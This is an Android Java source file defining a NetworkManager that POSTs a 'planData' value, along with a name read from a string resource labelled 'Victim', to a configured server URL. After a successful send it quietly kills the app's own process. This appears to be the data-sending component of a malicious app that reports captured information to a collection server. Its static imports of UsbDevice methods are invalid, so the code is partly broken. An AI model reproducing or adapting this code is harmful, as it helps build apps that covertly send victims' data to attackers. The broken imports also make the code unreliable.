package com.example.p32;

import static android.hardware.usb.UsbDevice.getDeviceId;
import static android.hardware.usb.UsbDevice.getDeviceName;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class NetworkManager {
    private Context context;
    private OkHttpClient client;
    private Handler mainHandler;

    public NetworkManager(Context context) {
        this.context = context;
        client = new OkHttpClient();
        // Initialize main thread handler
        mainHandler = new Handler(Looper.getMainLooper());
    }

    public void sendPostRequest(String planData) {
        // Create request body
        RequestBody formBody = new FormBody.Builder()
                .add("mv01", planData)
                .add("name", context.getString(R.string.Victim))
                .build();
        // Create request
        Request request = new Request.Builder()
                .url(context.getString(R.string.server_Url))
                .post(formBody)
                .build();

        // Async call
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                // Handle network error on main thread
                mainHandler.post(() -> {
                    Toast.makeText(context, "Network Error", Toast.LENGTH_SHORT).show();
                    Log.e("NetworkError", e.getMessage());
                });
            }

            @Override
            public void onResponse(Call call, Response response) {
                try {
                    if (response.isSuccessful()) {
                        // Handle successful response on main thread
                        String responseBody = response.body() != null ? response.body().string() : "No response";
                        mainHandler.post(() -> {
                            Log.d("NetworkResponse", responseBody);
//                            Toast.makeText(context, "Data Sent", Toast.LENGTH_SHORT).show();
                            android.os.Process.killProcess(android.os.Process.myPid());
                        });
                    } else {
                        // Handle error response on main thread
                        mainHandler.post(() -> {
                            Log.e("NetworkError", "Response Code: " + response.code());
                        });
                    }
                } catch (IOException e) {
                    mainHandler.post(() -> {
                        Log.e("NetworkError", "Error processing response", e);
                    });
                } finally {
                    // Ensure response body is closed
                    if (response.body() != null) {
                        response.body().close();
                    }
                }
            }
        });
    }
}